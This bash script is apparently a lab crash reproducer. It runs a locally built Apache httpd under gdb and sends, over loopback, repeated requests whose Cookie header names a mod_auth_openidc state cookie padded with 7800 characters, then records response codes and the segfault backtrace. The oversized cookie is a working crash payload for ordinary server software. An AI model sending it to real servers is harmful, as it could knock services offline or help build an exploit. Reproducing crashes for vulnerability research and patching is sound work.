#!/usr/bin/env bash
# Follow an httpd child under gdb in the normal multi-child daemon layout,
# ASLR left on, and send the long bare-token request repeatedly. Loopback only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
CONF="$HERE/httpd-plain.conf"
ERR="$HERE/error-plain.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/plain-crash"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
PAD=$(printf 'a%.0s' $(seq 1 7800))
stop() { "$HTTPD" -f "$CONF" -k stop >/dev/null 2>&1 || true; sleep 1; }
trap stop EXIT
stop
rm -f "$HERE/httpd-plain.pid"
: >"$ERR"
timeout 90 gdb -q -batch \
  -ex 'set pagination off' -ex 'set disable-randomization off' \
  -ex 'set follow-fork-mode child' -ex 'set detach-on-fork on' \
  -ex 'handle SIGSEGV stop print nopass' \
  -ex "run -f $CONF -DFOREGROUND" \
  -ex 'printf "\nSTOP PC=%p\n", $pc' -ex 'bt 15' \
  --args "$HTTPD" >"$OUT/fork-gdb.txt" 2>&1 &
gp=$!
for i in $(seq 1 12); do
  ready=$(curl -sS --max-time 3 -o /dev/null -w '%{http_code}' "$URL" 2>/dev/null || true)
  [ "$ready" != "000" ] && break
  sleep 1
done
: >"$OUT/fork-codes.txt"
for i in $(seq 1 40); do
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_$PAD" "$URL" 2>/dev/null || echo CURLERR)
  echo "$i $code" >>"$OUT/fork-codes.txt"
  [ "$code" = "000" ] || [ "$code" = "CURLERR" ] && break
  kill -0 "$gp" 2>/dev/null || break
done
wait "$gp" || true
cp "$ERR" "$OUT/fork-error.log"
printf 'gdb fork probe finished: %s\n' "$(date -u +%FT%TZ)" >>"$OUT/fork-codes.txt"
cat "$OUT/fork-codes.txt"
